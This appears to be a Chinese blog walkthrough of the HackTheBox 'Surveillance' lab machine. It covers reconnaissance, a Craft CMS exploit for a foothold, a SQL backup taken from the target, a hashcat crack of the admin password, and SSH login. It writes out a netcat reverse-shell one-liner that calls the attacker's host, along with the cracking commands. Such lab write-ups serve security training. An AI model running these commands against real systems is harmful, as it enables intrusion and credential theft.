#  一、信息收集

kali机器ip：10.10.16.53

靶机ip：10.10.11.245

首先nmap拿到基本端口开放信息

```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2024-02-02 11:53 CST
Stats: 0:00:15 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 18.26% done; ETC: 11:54 (0:01:03 remaining)
Nmap scan report for surveillance.htb (10.10.11.245)
Host is up (0.48s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96071cc6773e07a0cc6f2419744d570b (ECDSA)
|_  256 0ba4c0cfe23b95aef6f5df7d0c88d6ce (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title:  Surveillance 
|_http-server-header: nginx/1.18.0 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=2/2%OT=22%CT=1%CU=37763%PV=Y%DS=2%DC=T%G=Y%TM=65BC67CA
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=8)OPS(
OS:O1=M53AST11NW7%O2=M53AST11NW7%O3=M53ANNT11NW7%O4=M53AST11NW7%O5=M53AST11
OS:NW7%O6=M53AST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M53ANNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using proto 1/icmp)
HOP RTT       ADDRESS
1   583.76 ms 10.10.16.1 (10.10.16.1)
2   271.27 ms surveillance.htb (10.10.11.245)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 161.80 seconds
```

![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

发现开放了22和80两个端口，22是ssh，渗透优先级靠后，先看看80端口，浏览器访问（省略修改hosts文件步骤）

![img](https://img-blog.csdnimg.cn/direct/6e01404cee4147b7a2f77d79dbf5e387.png)![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)编辑用紫色小插件看出收集基本信息，得到有效信息craft cms，这是个美国公司开发的内容管理系统，找到一个可能的突破点

接下来对该网站进行目录爆破和子域名爆破，分别使用dirsearch和gobuster

步骤及结果如下

```bash
执行该代码
dirsearch -u http://surveillance.htb/
结果：

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )                                                                                 
                                                                                                        
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /usr/lib/python3/dist-packages/dirsearch/dirsearch_surveillance.htb.output

Error Log: /root/.dirsearch/logs/errors-24-02-02_14-17-17.log

Target: http://surveillance.htb/

[14:17:20] Starting: 
[14:17:41] 301 -  178B  - /js  ->  http://surveillance.htb/js/
[14:18:33] 200 -    0B  - /.gitkeep                                        
[14:18:37] 200 -  304B  - /.htaccess                                       
[14:22:24] 302 -    0B  - /admin  ->  http://surveillance.htb/admin/login   
[14:22:37] 302 -    0B  - /admin/  ->  http://surveillance.htb/admin/login  
[14:22:37] 302 -    0B  - /admin/?/login  ->  http://surveillance.htb/admin/login
[14:22:39] 302 -    0B  - /admin/admin  ->  http://surveillance.htb/admin/login
[14:22:42] 200 -   38KB - /admin/admin/login                                
[14:22:47] 302 -    0B  - /admin/index  ->  http://surveillance.htb/admin/login
[14:22:49] 200 -   38KB - /admin/login                                      
[14:26:49] 301 -  178B  - /css  ->  http://surveillance.htb/css/            
[14:28:06] 301 -  178B  - /fonts  ->  http://surveillance.htb/fonts/        
[14:28:44] 403 -  564B  - /images/                                          
[14:28:44] 301 -  178B  - /images  ->  http://surveillance.htb/images/
[14:28:45] 301 -  178B  - /img  ->  http://surveillance.htb/img/            
[14:28:53] 200 -    1B  - /index                                            
[14:28:54] 200 -   16KB - /index.php                                        
[14:28:55] 200 -    1B  - /index.php.                                       
[14:29:15] 403 -  564B  - /js/                                              
[14:29:54] 302 -    0B  - /logout  ->  http://surveillance.htb/             
[14:29:55] 302 -    0B  - /logout/  ->  http://surveillance.htb/            
[14:34:55] 200 -    1KB - /web.config                                       
[14:35:09] 418 -   24KB - /wp-admin/                                        
[14:35:09] 418 -   24KB - /wp-admin                                         
                                                                             
Task Completed
                                           
```

![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

```bash
进行子域名爆破
gobuster dns -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -domain devvortex.htb
结果：
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     omain
[+] Threads:    10
[+] Timeout:    1s
[+] Wordlist:   /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
===============================================================
2024/02/02 14:05:46 Starting gobuster in DNS enumeration mode
===============================================================

===============================================================
2024/02/02 14:14:07 Finished
===============================================================
```

![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

gobuster并未检测到子域名，dirsearch倒是爆出不少东西，但研究下来发现并没有什么有用的，于是只能将突破点放到cms上，使用msfconsole搜索看看有没有可用的poc

# 二、获得立足点

```bash
msfconsole

search craft cms 4
```

![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

有以下结果![img](https://img-blog.csdnimg.cn/direct/574308a2c20a4ad7b44f2a1ee02517c1.png)![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)编辑用第1个试试

```bash
use 1
show options
set rhosts http://surveillance.htb/
set lhost 10.10.16.53
run
```

![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

虽然显示可以利用但总是利用失败，不知道为什么，不过在网上找到了poc，成功利用

![img](https://img-blog.csdnimg.cn/direct/5c72baf8b90e45a6a62035ade4ef8ecd.png)![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)编辑

但是这个shell并没有交互性且很慢，所以换一个。这边参考了这篇文章（[【渗透测试】Surveillance - HackTheBox，网络摄像头渗透+SSH端口转发访问本地资源_hackthebox surveillance-CSDN博客](https://blog.csdn.net/m0_74272345/article/details/135016035)）执行

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.16.53 4444 >/tmp/f
```

![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

同时nc -nlvp 4444拿到shell

![img](https://s2.loli.net/2024/03/07/R17YLCU6dQtcZlG.png)![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)编辑

这边进入到 ../storage/backups文件夹发现一个sql的备份文件，下载下来看看

![img](https://img-blog.csdnimg.cn/direct/1cb3f5f5bc6141e1a798a7f1017820d1.png)![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)编辑

用python3开web服务下载下来

```bash
靶机执行：
python3 -m http.server 8965

kali执行：
http://surveillance.htb:8965/surveillance--2023-10-17-202801--v4.4.14.sql.zip
```

![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

打开看看有没有什么东西

发现是个dump文件，通过kali自带的mysql进行恢复

```bash
service mysql start 
mysql
create database db1
ctrl+z
mysql -uroot -p****** < surveillance--2023-10-17-202801--v4.4.14.sql
```

![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

恢复后在users表里发现了admin用户，可能存在密码复用，破解试试

用hashcat破解

```bash
hashcat passwd.hash /usr/share/wordlists/rockyou.txt -m 1400
```

![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

![img](https://img-blog.csdnimg.cn/direct/687a8f4951c043659959f587fd5c9485.png)![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)编辑

拿到密码，通过观察admin用户的名称为Matthew，试试ssh

```bash
ssh matthew@10.10.11.245
```

![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

成功进入

![img](https://s2.loli.net/2024/03/07/m8nqYZv4eTPwaHW.png)![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)编辑

拿到user flag

![img](https://s2.loli.net/2024/03/07/BvWJOMiXP58k2ef.png)![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)编辑

接下来传入linpeas.sh看看提权

 找到很多密码，但毫无思路，后序参考文章[【渗透测试】Surveillance - HackTheBox，网络摄像头渗透+SSH端口转发访问本地资源_hackthebox surveillance-CSDN博客](https://blog.csdn.net/m0_74272345/article/details/135016035)